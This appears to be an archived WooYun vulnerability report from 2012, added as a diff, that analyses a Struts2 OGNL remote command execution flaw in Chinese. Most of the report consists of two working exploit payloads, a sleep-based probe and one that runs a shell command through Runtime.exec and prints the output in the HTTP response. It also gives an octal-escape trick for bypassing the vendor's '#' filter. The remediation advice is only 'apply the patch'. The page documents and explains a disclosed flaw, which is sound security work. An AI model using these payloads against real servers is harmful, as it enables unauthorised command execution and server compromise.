@@ -1,0 +1,249 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		structs2 远程命令执行漏洞分析  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		structs2 远程命令执行漏洞分析  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/livers">livers</a> 
+</li><li>提交时间：		2012-06-29 13:49</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-06-29：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2012-06-29：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">很惊异 老漏洞一下子爆发了这么多 是工具刷rank ？<br />
+能否分析下原理。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">大牛们不要见笑。<br />
+<br />
+新的exp 构造的很精巧<br />
+<br />
+<br />
+<br />
+以POST的方式提交绕过对输入参数的部分过滤。<br />
+<br />
+<br />
+<br />
+(&#039;\43_memberAccess.allowStaticMethodAccess&#039;)(a)=true&amp;(b)((&#039;\43context[\&#039;xwork.MethodAccessor.denyMethodExecution\&#039;]\75false&#039;)(b))&amp;(&#039;\43c&#039;)((&#039;\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET&#039;)(c))&amp;(d)((&#039;@java.lang.Thread@sleep(8000)&#039;)(d))<br />
+<br />
+当前线程sleep 8S<br />
+<br />
+命令执行主要是通过ognl对象的上下文内置静态函数进行执行的。<br />
+<br />
+如@Runtime@getRuntime().exec<br />
+<br />
+@class@method  访问静态方法<br />
+<br />
+xwork 的ognl语句 执行，变量必须要带有#，之前通过\0023  (16进制的#) 来绕过，官方补丁屏蔽了这种但是可以利用\43(8进制的#)进行绕过。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+实现交互的shell.<br />
+<br />
+(&#039;\43_memberAccess.allowStaticMethodAccess&#039;)(a)=true&amp;(b)((&#039;\43context[\&#039;xwork.MethodAccessor.denyMethodExecution\&#039;]\75false&#039;)(b))&amp;(&#039;\43c&#039;)((&#039;\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET&#039;)(c))&amp;(g)((&#039;\43mycmd\75\&#039;ls\40\u002dl\&#039;&#039;)(d))&amp;(h)((&#039;\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)&#039;)(d))&amp;(i)((&#039;\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())&#039;)(d))&amp;(j)((&#039;\43myres\75new\40byte[51020]&#039;)(d))&amp;(k)((&#039;\43mydat.readFully(\43myres)&#039;)(d))&amp;(l)((&#039;\43mystr\75new\40java.lang.String(\43myres)&#039;)(d))&amp;(m)((&#039;\43myout\75@org.apache.struts2.ServletActionContext@getResponse()&#039;)(d))&amp;(n)((&#039;\43myout.getWriter().println(\43mystr)&#039;)(d))<br />
+<br />
+<br />
+<br />
+\75 (=的8进制)\40（空格的8进制）  ongl语句中执行的参数不允许出现空格。当然包括其他<br />
+<br />
+老版本的正则 是^#=:都不允许，通杀的话是用\40来替代。<br />
+<br />
+<br />
+<br />
+这样上面就是<br />
+<br />
+1.设置上下文denyMethodExecution=false 运行方法执行<br />
+<br />
+2.excludeProperties=@java.util.Collections@EMPTY_SET  （@class@调用静态变量）<br />
+<br />
+设置外部拦截器为空<br />
+<br />
+3.mycmd=“ls -l”  定义我们的执行命令的变量  <br />
+<br />
+4.myret=@java.lang.Runtime@getRuntime().exec(\43mycmd)&#039;) (调用静态方法执行我们的变量)<br />
+<br />
+5.mydat=new java.io.DataInputStream(\43myret.getInputStream())&#039;)  获取输入流  (post)<br />
+<br />
+6.myres=new data[51020];mydat.readfully(myres); 读取输入流<br />
+<br />
+(5,6为了转换输入流的类型)<br />
+<br />
+7.mystr=new java.lang.String(#myres)  ;定义并赋值输入流<br />
+<br />
+8.myout=org.apache.struts2.ServletActionContext@getResponse()  ;得到repsonse的数据<br />
+<br />
+9.myout.getWriter().println(#mystr) ;把response的数据打印到屏幕上。<br />
+<br />
+<br />
+<br />
+这个和 zone 上 http://zone.wooyun.org/content/200说的一致<br />
+<br />
+GaRY   | 2012-05-10 13:36<br />
+<br />
+@livers 其实原理就和我之前用php操作fd复用链接直接生成shell一样。java更直接，因为tomcat等container和webapp几乎没界限，同一层面的东西。所以只要找到这个上下文的writer，往里面读写就ok了。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+看了衰仔和 gainover他们的工具是利用方式是一样的，好巧<br />
+<br />
+<br />
+<br />
+构造post 和绕过变量还有其他方法进行执行。<br />
+<br />
+<br />
+<br />
+PS：其实我不懂java.<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/2913205009d711f933a84146d5c1da0c1bc36013.jpg" target="_blank"><img src="../images/2913205009d711f933a84146d5c1da0c1bc36013.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/29132103f144773201364bbae2065a036139f610.jpg" target="_blank"><img src="../images/29132103f144773201364bbae2065a036139f610.jpg" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">打补丁 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/livers" title="livers">livers</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-08994" title="structs2 远程命令执行漏洞分析">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																<p class="detail">漏洞Rank：10 (WooYun评价)</p>
+												
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="8994";
+var bugRating="2";
+var myRating="";
+var ratingCount="9";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
